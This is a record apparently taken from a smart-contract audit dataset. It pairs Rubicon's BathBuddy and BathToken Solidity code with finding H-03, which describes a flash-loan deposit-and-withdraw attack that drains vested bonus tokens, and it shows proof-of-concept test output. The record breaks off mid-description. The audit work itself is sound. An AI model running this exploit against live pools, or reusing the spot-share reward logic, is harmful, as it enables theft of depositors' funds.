[
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.8.0;\n\nimport \"./VestingWallet.sol\";\nimport \"../interfaces/IBathBuddy.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/**\n * @title BathBuddy\n * @dev *** This contract is a lightly modified version of Vesting Wallet by OpenZeppelin\n * @dev PLEASE FIND OZ DOCUMENTATION FOR THIS CONTRACT HERE: https://docs.openzeppelin.com/contracts/4.x/api/finance#VestingWallet\n *\n * @dev The only entrypoint used in the system is the release function called by the Bath Token. Extra care should be taken to make sure only the beneficiary can ever access the funds and send them to the withdrawer (and fee to self)\n *\n * @dev This contract handles the vesting ERC20 tokens for a given beneficiary. Custody of multiple tokens\n * can be given to this contract, which will release the token to the beneficiary following a given vesting schedule.\n * The vesting schedule is customizable through the {vestedAmount} function.\n *\n * Any token transferred to this contract will follow the vesting schedule as if they were locked from the beginning.\n * Consequently, if the vesting has already started, any amount of tokens sent to this contract will (at least partly)\n * be immediately releasable.\n */\ncontract BathBuddy is IBathBuddy {\n    using SafeMath for uint256;\n\n    // Public versions of the base VestingWallet storage\n    uint256 private _released;\n    mapping(address => uint256) private _erc20Released;\n\n    // Beneficiary must be the Bath Token vault recipient that will call release() for its withdrawer\n    address public beneficiary;\n    uint64 public start;\n    uint64 public duration;\n\n    /**\n     * @dev Set the beneficiary, start timestamp and vesting duration of the vesting wallet.\n     */\n    constructor(\n        address beneficiaryAddress,\n        uint64 startTimestamp,\n        uint64 durationSeconds\n    ) {\n        require(\n            beneficiaryAddress != address(0),\n            \"VestingWallet: beneficiary is zero address\"\n        );\n        beneficiary = beneficiaryAddress;\n        start = startTimestamp;\n        duration = durationSeconds;\n    }\n\n    // OZ\n    event EtherReleased(uint256 amount);\n    event ERC20Released(address indexed token, uint256 amount);\n\n    /// @notice Log bonus token reward event\n    event LogClaimBonusToken(\n        address indexed receiver,\n        address indexed callingPool,\n        uint256 amountReceived,\n        uint256 shares,\n        IERC20 bonusToken,\n        uint256 releasableAmountToWholePool\n    );\n\n    /**\n     * @dev The contract should be able to receive Eth.\n     */\n    receive() external payable {}\n\n    /**\n     * @dev Amount of eth already released\n     */\n    function released() public view returns (uint256) {\n        return _released;\n    }\n\n    /**\n     * @dev Amount of token already released\n     */\n    function released(address token) public view returns (uint256) {\n        return _erc20Released[token];\n    }\n\n    /// @inheritdoc IBathBuddy\n    /// @dev Added and modified release function. Should be the only callable release function\n    function release(\n        IERC20 token,\n        address recipient,\n        uint256 sharesWithdrawn,\n        uint256 initialTotalSupply,\n        uint256 poolFee\n    ) external override {\n        require(\n            msg.sender == beneficiary,\n            \"Caller is not the Bath Token beneficiary of these rewards\"\n        );\n        uint256 releasable = vestedAmount(\n            address(token),\n            uint64(block.timestamp)\n        ) - released(address(token));\n        if (releasable > 0) {\n            uint256 amount = releasable.mul(sharesWithdrawn).div(\n                initialTotalSupply\n            );\n            uint256 _fee = amount.mul(poolFee).div(10000);\n\n            // If FeeTo == address(this) then the fee is effectively accrued by the pool\n            // Assume the caller is the liquidity pool and they receive the fee\n            // Keep tokens here by not transfering the _fee anywhere, it is accrued to the Bath Token's Bath Buddy\n            // token.transfer(address(this), _fee);\n\n            uint256 amountWithdrawn = amount.sub(_fee);\n            token.transfer(recipient, amountWithdrawn);\n\n            _erc20Released[address(token)] += amount;\n            emit ERC20Released(address(token), amount);\n\n            emit LogClaimBonusToken(\n                recipient,\n                msg.sender,\n                amountWithdrawn,\n                sharesWithdrawn,\n                token,\n                releasable\n            );\n        }\n    }\n\n    /**\n     * @dev Calculates the amount of tokens that has already vested. Default implementation is a linear vesting curve.\n     */\n    function vestedAmount(address token, uint64 timestamp)\n        public\n        view\n        returns (uint256)\n    {\n        return\n            _vestingSchedule(\n                IERC20(token).balanceOf(address(this)) + released(token),\n                timestamp\n            );\n    }\n\n    /**\n     * @dev Virtual implementation of the vesting formula. This returns the amount vested, as a function of time, for\n     * an asset given its total historical allocation.\n     */\n    function _vestingSchedule(uint256 totalAllocation, uint64 timestamp)\n        internal\n        view\n        returns (uint256)\n    {\n        if (timestamp < start) {\n            return 0;\n        } else if (timestamp > start + duration) {\n            return totalAllocation;\n        } else {\n            return (totalAllocation * (timestamp - start)) / duration;\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice This contract represents a single-asset liquidity pool for Rubicon Pools\n/// @notice Any user can deposit assets into this pool and earn yield from successful strategist market making with their liquidity\n/// @notice This contract looks to both BathPairs and the BathHouse as its admin\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"../interfaces/IBathHouse.sol\";\nimport \"../interfaces/IRubiconMarket.sol\";\nimport \"../interfaces/IBathBuddy.sol\";\n\ncontract BathToken {\n    using SafeMath for uint256;\n\n    /// *** Storage Variables ***\n\n    /// @notice The initialization status of the Bath Token\n    bool public initialized;\n\n    /// @notice  ** ERC-20 **\n    string public symbol;\n    string public name;\n    uint8 public decimals;\n\n    /// @notice The RubiconMarket.sol instance that all pool liquidity is intially directed to as market-making offers\n    address public RubiconMarketAddress;\n\n    /// @notice The Bath House admin of the Bath Token\n    address public bathHouse;\n\n    /// @notice The withdrawal fee recipient, typically the Bath Token itself\n    address public feeTo;\n\n    /// @notice The underlying ERC-20 token which is the core asset of the Bath Token vault\n    IERC20 public underlyingToken;\n\n    /// @notice The basis point fee rate that is paid on withdrawing the underlyingToken and bonusTokens\n    uint256 public feeBPS;\n\n    /// @notice ** ERC-20 **\n    uint256 public totalSupply;\n\n    /// @notice The amount of underlying deposits that are outstanding attempting market-making on the order book for yield\n    /// @dev quantity of underlyingToken that is in the orderbook that the pool still has a claim on\n    /// @dev The underlyingToken is effectively mark-to-marketed when it enters the book and it could be returned at a loss due to poor strategist performance\n    /// @dev outstandingAmount is NOT inclusive of any non-underlyingToken assets sitting on the Bath Tokens that have filled to here and are awaiting rebalancing to the underlyingToken by strategists\n    uint256 public outstandingAmount;\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    uint256[] deprecatedStorageArray; // Kept in to avoid storage collision bathTokens that are proxy upgraded\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    mapping(uint256 => uint256) deprecatedMapping; // Kept in to avoid storage collision on bathTokens that are upgraded\n    // *******************************************\n\n    /// @notice  ** ERC-20 **\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /// @notice EIP-2612\n    bytes32 public DOMAIN_SEPARATOR;\n\n    /// @notice EIP-2612\n    /// @dev keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n    /// @notice EIP-2612\n    mapping(address => uint256) public nonces;\n\n    /// @notice Array of Bonus ERC-20 tokens that are given as liquidity incentives to pool withdrawers\n    address[] public bonusTokens;\n\n    /// @notice Address of the OZ Vesting Wallet which acts as means to vest bonusToken incentives to pool HODLers\n    IBathBuddy public rewardsVestingWallet;\n\n    /// *** Events ***\n\n    /// @notice ** ERC-20 **\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    /// @notice ** ERC-20 **\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Time of Bath Token instantiation\n    event LogInit(uint256 timeOfInit);\n\n    /// @notice Log details about a pool deposit\n    event LogDeposit(\n        uint256 depositedAmt,\n        IERC20 asset,\n        uint256 sharesReceived,\n        address depositor,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool withdraw\n    event LogWithdraw(\n        uint256 amountWithdrawn,\n        IERC20 asset,\n        uint256 sharesWithdrawn,\n        address withdrawer,\n        uint256 fee,\n        address feeTo,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool rebalance\n    event LogRebalance(\n        IERC20 pool_asset,\n        address destination,\n        IERC20 transferAsset,\n        uint256 rebalAmt,\n        uint256 stratReward,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order canceled in the Rubicon Market book\n    event LogPoolCancel(\n        uint256 orderId,\n        IERC20 pool_asset,\n        uint256 outstandingAmountToCancel,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order placed in the Rubicon Market book\n    event LogPoolOffer(\n        uint256 id,\n        IERC20 pool_asset,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log the credit to outstanding amount for funds that have been filled market-making\n    event LogRemoveFilledTradeAmount(\n        IERC20 pool_asset,\n        uint256 fillAmount,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice * EIP 4626 *\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// @notice * EIP 4626 *\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// *** Constructor ***\n\n    /// @notice Proxy-safe initialization of storage; the constructor\n    function initialize(\n        ERC20 token,\n        address market,\n        address _feeTo\n    ) external {\n        require(!initialized);\n        string memory _symbol = string(\n            abi.encodePacked((\"bath\"), token.symbol())\n        );\n        symbol = _symbol;\n        underlyingToken = token;\n        RubiconMarketAddress = market;\n        bathHouse = msg.sender; //NOTE: assumed admin is creator on BathHouse\n\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n        name = string(abi.encodePacked(_symbol, (\" v1\")));\n        decimals = token.decimals(); // v1 Change - 4626 Adherence\n\n        // Add infinite approval of Rubicon Market for this asset\n        IERC20(address(token)).approve(RubiconMarketAddress, 2**256 - 1);\n        emit LogInit(block.timestamp);\n\n        feeTo = address(this); //This contract is the fee recipient, rewarding HODLers\n        feeBPS = 3; //Fee set to 3 BPS initially\n\n        // Complete constract instantiation\n        initialized = true;\n    }\n\n    /// *** Modifiers ***\n\n    modifier onlyPair() {\n        require(\n            IBathHouse(bathHouse).isApprovedPair(msg.sender) == true,\n            \"not an approved pair - bathToken\"\n        );\n        _;\n    }\n\n    modifier onlyBathHouse() {\n        require(\n            msg.sender == bathHouse,\n            \"caller is not bathHouse - BathToken.sol\"\n        );\n        _;\n    }\n\n    /// *** External Functions - Only Bath House / Admin ***\n\n    /// @notice Admin-only function to set a Bath Token's market address\n    function setMarket(address newRubiconMarket) external onlyBathHouse {\n        RubiconMarketAddress = newRubiconMarket;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathHouse(address newBathHouse) external onlyBathHouse {\n        bathHouse = newBathHouse;\n    }\n\n    /// @notice Admin-only function to approve Bath Token's RubiconMarketAddress with the maximum integer value (infinite approval)\n    function approveMarket() external onlyBathHouse {\n        underlyingToken.approve(RubiconMarketAddress, 2**256 - 1);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setFeeBPS(uint256 _feeBPS) external onlyBathHouse {\n        feeBPS = _feeBPS;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient, typically the pool itself\n    function setFeeTo(address _feeTo) external onlyBathHouse {\n        feeTo = _feeTo;\n    }\n\n    /// @notice Admin-only function to add a bonus token to bonusTokens for pool incentives\n    function setBonusToken(address newBonusERC20) external onlyBathHouse {\n        bonusTokens.push(newBonusERC20);\n    }\n\n    /// *** External Functions - Only Approved Bath Pair / Strategist Contract ***\n\n    /// ** Rubicon Market Functions **\n\n    /// @notice The function for a strategist to cancel an outstanding Market Offer\n    function cancel(uint256 id, uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        IRubiconMarket(RubiconMarketAddress).cancel(id);\n\n        emit LogPoolCancel(\n            id,\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice A function called by BathPair to maintain proper accounting of outstandingAmount\n    function removeFilledTradeAmount(uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        emit LogRemoveFilledTradeAmount(\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice The function that places a bid and/or ask in the orderbook for a given pair from this pool\n    function placeOffer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) external onlyPair returns (uint256) {\n        // Place an offer in RubiconMarket\n        // If incomplete offer return 0\n        if (\n            pay_amt == 0 ||\n            pay_gem == ERC20(0) ||\n            buy_amt == 0 ||\n            buy_gem == ERC20(0)\n        ) {\n            return 0;\n        }\n\n        uint256 id = IRubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            false\n        );\n        outstandingAmount = outstandingAmount.add(pay_amt);\n\n        emit LogPoolOffer(\n            id,\n            IERC20(underlyingToken),\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        return (id);\n    }\n\n    /// @notice This function returns filled orders to the correct liquidity pool and sends strategist rewards to the Bath Pair\n    /// @dev Sends non-underlyingToken fill elsewhere in the Pools system, typically it's sister asset within a trading pair (e.g. ETH-USDC)\n    /// @dev Strategists presently accrue rewards in the filled asset not underlyingToken\n    function rebalance(\n        address destination,\n        address filledAssetToRebalance, /* sister or fill asset */\n        uint256 stratProportion,\n        uint256 rebalAmt\n    ) external onlyPair {\n        uint256 stratReward = (stratProportion.mul(rebalAmt)).div(10000);\n        IERC20(filledAssetToRebalance).transfer(\n            destination,\n            rebalAmt.sub(stratReward)\n        );\n        IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward);\n\n        emit LogRebalance(\n            IERC20(underlyingToken),\n            destination,\n            IERC20(filledAssetToRebalance),\n            rebalAmt,\n            stratReward,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// *** EIP 4626 Implementation ***\n    // https://eips.ethereum.org/EIPS/eip-4626#specification\n\n    /// @notice Withdraw your bathTokens for the underlyingToken\n    function withdraw(uint256 _shares)\n        external\n        returns (uint256 amountWithdrawn)\n    {\n        return _withdraw(_shares, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function asset() public view returns (address assetTokenAddress) {\n        assetTokenAddress = address(underlyingToken);\n    }\n\n    /// @notice * EIP 4626 *\n    function totalAssets() public view returns (uint256 totalManagedAssets) {\n        return underlyingBalance();\n    }\n\n    /// @notice * EIP 4626 *\n    function convertToShares(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // Note: Inflationary tokens may affect this logic\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(totalAssets());\n    }\n\n    // Note: MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// @notice * EIP 4626 *\n    function convertToAssets(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        assets = (totalAssets().mul(shares)).div(totalSupply);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxDeposit(address receiver)\n        public\n        pure\n        returns (uint256 maxAssets)\n    {\n        maxAssets = 2**256 - 1; // No limit on deposits in current implementation  = Max UINT\n    }\n\n    /// @notice * EIP 4626 *\n    function previewDeposit(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // The exact same logic is used, no deposit fee - only difference is deflationary token check (rare condition and probably redundant)\n        shares = convertToShares(assets);\n    }\n\n    // Single asset override to reflect old functionality\n    function deposit(uint256 assets) public returns (uint256 shares) {\n        // Note: msg.sender is the same throughout the same contract context\n        return _deposit(assets, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function deposit(uint256 assets, address receiver)\n        public\n        returns (uint256 shares)\n    {\n        return _deposit(assets, receiver);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxMint(address receiver) public pure returns (uint256 maxShares) {\n        maxShares = 2**256 - 1; // No limit on shares that could be created via deposit in current implementation - Max UINT\n    }\n\n    // Given I want these shares, how much do I have to deposit\n    /// @notice * EIP 4626 *\n    function previewMint(uint256 shares) public view returns (uint256 assets) {\n        (totalSupply == 0) ? assets = shares : assets = (\n            shares.mul(totalAssets())\n        ).div(totalSupply);\n    }\n\n    // Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.\n    /// @notice * EIP 4626 *\n    function mint(uint256 shares, address receiver)\n        public\n        returns (uint256 assets)\n    {\n        assets = previewMint(shares);\n        uint256 _shares = _deposit(assets, receiver);\n        require(_shares == shares, \"did not mint expected share count\");\n    }\n\n    // A user can withdraw whatever they hold\n    /// @notice * EIP 4626 *\n    function maxWithdraw(address owner)\n        public\n        view\n        returns (uint256 maxAssets)\n    {\n        if (totalSupply == 0) {\n            maxAssets = 0;\n        } else {\n            uint256 ownerShares = balanceOf[owner];\n            maxAssets = convertToAssets(ownerShares);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function previewWithdraw(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        if (totalSupply == 0) {\n            shares = 0;\n        } else {\n            uint256 amountWithdrawn;\n            uint256 _fee = assets.mul(feeBPS).div(10000);\n            amountWithdrawn = assets.sub(_fee);\n            shares = convertToShares(amountWithdrawn);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public returns (uint256 shares) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        uint256 expectedShares = previewWithdraw(assets);\n        uint256 assetsReceived = _withdraw(expectedShares, receiver);\n        require(\n            assetsReceived >= assets,\n            \"You cannot withdraw the amount of assets you expected\"\n        );\n        shares = expectedShares;\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function maxRedeem(address owner) public view returns (uint256 maxShares) {\n        return balanceOf[owner];\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function previewRedeem(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        uint256 r = (underlyingBalance().mul(shares)).div(totalSupply);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        assets = r.sub(_fee);\n    }\n\n    /// @notice * EIP 4626 *\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public returns (uint256 assets) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        assets = _withdraw(shares, receiver);\n    }\n\n    /// *** Internal Functions ***\n\n    /// @notice Deposit assets for the user and mint Bath Token shares to receiver\n    function _deposit(uint256 assets, address receiver)\n        internal\n        returns (uint256 shares)\n    {\n        uint256 _pool = underlyingBalance();\n        uint256 _before = underlyingToken.balanceOf(address(this));\n\n        // **Assume caller is depositor**\n        underlyingToken.transferFrom(msg.sender, address(this), assets);\n        uint256 _after = underlyingToken.balanceOf(address(this));\n        assets = _after.sub(_before); // Additional check for deflationary tokens\n\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(_pool);\n\n        // Send shares to designated target\n        _mint(receiver, shares);\n        emit LogDeposit(\n            assets,\n            underlyingToken,\n            shares,\n            msg.sender,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Deposit(msg.sender, msg.sender, assets, shares);\n    }\n\n    /// @notice Withdraw share for the user and send underlyingToken to receiver with any accrued yield and incentive tokens\n    function _withdraw(uint256 _shares, address receiver)\n        internal\n        returns (uint256 amountWithdrawn)\n    {\n        uint256 _initialTotalSupply = totalSupply;\n\n        // Distribute network rewards first in order to handle bonus token == underlying token case; it only releases vested tokens in this call\n        distributeBonusTokenRewards(receiver, _shares, _initialTotalSupply);\n\n        uint256 r = (underlyingBalance().mul(_shares)).div(_initialTotalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.transfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.transfer(receiver, amountWithdrawn);\n\n        emit LogWithdraw(\n            amountWithdrawn,\n            underlyingToken,\n            _shares,\n            msg.sender,\n            _fee,\n            feeTo,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Withdraw(\n            msg.sender,\n            receiver,\n            msg.sender,\n            amountWithdrawn,\n            _shares\n        );\n    }\n\n    /// @notice Function to distibute non-underlyingToken Bath Token incentives to pool withdrawers\n    /// @dev Note that bonusTokens adhere to the same feeTo and feeBPS pattern. Fees sit on BathBuddy to act as effectively accrued to the pool.\n    function distributeBonusTokenRewards(\n        address receiver,\n        uint256 sharesWithdrawn,\n        uint256 initialTotalSupply\n    ) internal {\n        if (bonusTokens.length > 0) {\n            for (uint256 index = 0; index < bonusTokens.length; index++) {\n                IERC20 token = IERC20(bonusTokens[index]);\n                // Note: Shares already burned in Bath Token _withdraw\n\n                // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they\n                //  are released their relative share of this pool, of vested BathBuddy rewards\n                // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens\n                if (rewardsVestingWallet != IBathBuddy(0)) {\n                    rewardsVestingWallet.release(\n                        (token),\n                        receiver,\n                        sharesWithdrawn,\n                        initialTotalSupply,\n                        feeBPS\n                    );\n                }\n            }\n        }\n    }\n\n    /// *** ERC - 20 Standard ***\n\n    function _mint(address to, uint256 value) internal {\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    }\n\n    function _burn(address from, uint256 value) internal {\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) private {\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) private {\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != uint256(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /// @notice EIP 2612\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        require(deadline >= block.timestamp, \"bathToken: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) && recoveredAddress == owner,\n            \"bathToken: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    }\n\n    /// *** View Functions ***\n\n    /// @notice The underlying ERC-20 that this bathToken handles\n    function underlyingERC20() external view returns (address) {\n        return address(underlyingToken);\n    }\n\n    /// @notice The best-guess total claim on assets the Bath Token has\n    /// @dev returns the amount of underlying ERC20 tokens in this pool in addition to any tokens that are outstanding in the Rubicon order book seeking market-making yield (outstandingAmount)\n    function underlyingBalance() public view returns (uint256) {\n        uint256 _pool = IERC20(underlyingToken).balanceOf(address(this));\n        return _pool.add(outstandingAmount);\n    }\n}\n\n\n",
        "CodeNames": [
            "BathBuddy.sol",
            "BathToken.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "//solidity\n/// @inheritdoc IBathBuddy\n/// @dev Added and modified release function. Should be the only callable release function\nfunction release(\n    IERC20 token,\n    address recipient,\n    uint256 sharesWithdrawn,\n    uint256 initialTotalSupply,\n    uint256 poolFee\n) external override {\n    require(\n        msg.sender == beneficiary,\n        \"Caller is not the Bath Token beneficiary of these rewards\"\n    );\n    uint256 releasable = vestedAmount(\n        address(token),\n        uint64(block.timestamp)\n    ) released(address(token));\n    if (releasable  0) {\n        uint256 amount = releasable.mul(sharesWithdrawn).div(\n            initialTotalSupply\n        );\n        uint256 _fee = amount.mul(poolFee).div(10000);\n\n        ..SNIP..\n\n        uint256 amountWithdrawn = amount.sub(_fee);\n        token.transfer(recipient, amountWithdrawn);\n\n        _erc20Released[address(token)] += amount;\n        ..SNIP..\n    }\n}\n",
                    "javascript\n  Contract: Rubicon Exchange and Pools Original Tests\n    Deployment\n      \u2713 is deployed (1783ms)\n    Bath House Initialization of Bath Pair and Bath Tokens\n      \u2713 Bath House is deployed and initialized (66ms)\n        new bathWETH! 0x237eda6f0102c1684caEbA3Ebd89e26a79258C6f\n      \u2713 WETH Bath Token for WETH asset is deployed and initialized (131ms)\n      \u2713 Init BathBuddy Vesting Wallet and Add BathBuddy to WETH BathToken Pool (54ms)\n      \u2713 Bath Pair is deployed and initialized w/ BathHouse (59ms)\n        undefined\n      \u2713 Alice deposit 50 WETH to WETH bathTokens (137ms)\n        undefined\n      \u2713 Bob deposit 50 WETH to WETH bathTokens (174ms)\nbathAssetInstance.bonusTokens.length = 1\nbathBuddyInstance (Vesting Wallet) has 1000 DAI\nbathBuddyInstance.vestedAmount(DAI) = 0.000413359788359788\nbathBuddyInstance.vestedAmount(DAI) = 500.000413359788359788 (End of 2nd week)\nbathBuddyInstance.vestedAmount(DAI) = 998.512318121693121693 (Last hour of the vesting period)\n0 DAI has been released from BathBuddy Vesting Wallet\nCharles has 8500 bathWETH token, 0 DAI, 0 WETH\nCharles withdraw all his bathWETH tokens\n997.338978147402060445 DAI has been released from BathBuddy Vesting Wallet\nCharles has 0 bathWETH token, 997.039776453957839827 DAI, 8497.45 WETH\nAlice has 5 bathWETH token, 0 DAI, 0 WETH\n998.075233164534207763 DAI has been released from BathBuddy Vesting Wallet\nAlice has 0 bathWETH token, 0.736034140627007674 DAI, 6.2731175 WETH\n      \u2713 Add Rewards (100 DAI) to BathBuddy Vesting Wallet  (749ms)\nbathAssetInstance: underlyingBalance() = 6.2768825 WETH, balanceOf = 6.2768825 WETH, Outstanding Amount = 0 WETH\n      \u2713 Debug]\n"
                ],
                "Type": " Attacker could steal almost all the bonus tokens in BathBuddy Vesting Wallet",
                "Description": "\nBathBuddy is a Vesting Wallet that payout withdrawers any bonusTokens they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).\n\nBathBuddy Vesting Wallet releases a user their relative share of the pool\u2019s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.\n\nIt was observed that an attacker could steal almost all the bonusTokens in the BathBuddy Vesting Wallet.\n\n\nThe root cause of this issue is that the amount of bonusTokens that a user is entitled to is based on their relative share of the pool\u2019s total vested bonus token at the point of the withdraw call. It is calculated based on the user's \"spot\" share in the pool. \n\nThus, it is possible for an attacker to deposit large amount of tokens into a BathToken Pool to gain significant share of the pool (e.g. 95%), and then withdraw the all the shares immediately. The withdraw call will trigger the BathToken.distributeBonusTokenRewards, and since attacker holds overwhelming amount of share in the pool, they will receive almost all the bonusToken in the BathBuddy Vesting wallet, leaving behind dust amount of bonusToken in the wallet. This could be perform in an atomic transaction and attacker can leverage on flash-loan to fund this attack.\n\nThe following shows an example of this issue:\n\n1.  A sponsor sent 1000 DAI to the BathBuddy Vesting Wallet to be used as bonusTokens for bathWETH pool. The vesting duration is 4 weeks.\n2.  Alice and Bob deposited 50 WETH and 50 WETH respectively. The total underlying asset of bathWETH is 100 WETH after depositing. Each of them hold 50% of the shares in the pool.\n3.  Fast forward to the last hour of the vesting period, most of the bonusToken have been vested and ready for the recipients to claim. In this example, estimate 998 DAI are ready to be claimed at the final hour.\n4.  Since Alice has 50% stake in the pool, she should have accured close to 449 DAI at this point. If she decided to withdraw all her bathWETH LP tokens at this point, she would receive close to 449 DAI as bonusTokens. But she choose not to withdraw yet.\n5.  Unfortunately, an attacker performed a flash-loan to borrow 8500 WETH, and deposit large amount of WETH into the bathWETH gain significant share of the pool, and then withdraw the all the 